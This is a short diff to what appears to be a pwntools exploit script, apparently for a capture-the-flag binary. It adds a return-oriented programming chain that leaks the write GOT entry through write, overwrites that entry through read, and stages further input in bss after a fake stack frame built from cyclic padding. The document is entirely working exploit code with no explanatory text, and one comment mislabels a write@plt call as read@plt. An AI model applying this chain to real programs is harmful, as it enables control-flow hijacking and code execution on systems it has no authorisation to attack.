@@ -7,8 +7,24 @@ payload = b''.join([
     cyclic(0x88), p32(bss-4), # setup fake stack frame
 
     p32(elf.plt['write']), # call read@plt => return to bss
+    p32(0x080484B6),    # pop esi ; pop edi ; pop ebp
+    p32(1),
+    p32(elf.got['write']),
+    p32(4),
     p32(elf.plt['write']),
-    p32(1)
+
+    p32(0x080484B6),    # pop esi ; pop edi ; pop ebp
+    p32(0),
+    p32(elf.got['write']),
+    p32(4),
+    p32(elf.plt['read']),
+
+    p32(0x080484B6),    # pop esi ; pop edi ; pop ebp
+    p32(0),
+    p32(bss),
+    p32(2),
+    p32(elf.plt['write']),
+
 ])
 p = elf.process()
 pause()
